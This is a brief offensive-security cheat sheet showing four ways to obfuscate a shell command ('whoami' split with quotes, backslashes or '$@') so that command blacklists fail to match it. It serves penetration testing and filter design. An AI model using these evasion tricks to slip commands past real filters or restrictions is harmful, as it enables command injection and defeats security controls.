# Bypassing Blacklisted Commands

## Single Quotes

```sh
my@attack:~$ w'h'o'a'm'i'
```

## Double Quotes

```sh
my@attack:~$ w"h"o"a"m"i"
```

## Backslash

```sh
my@attack:~$ w\h\o\a\m\i
```

## [Positional Parameters](https://www.gnu.org/software/bash/manual/html_node/Special-Parameters.html#index-_0040)

```sh
my@attack:~$ w$@h$@o$@a$@m$@i
```
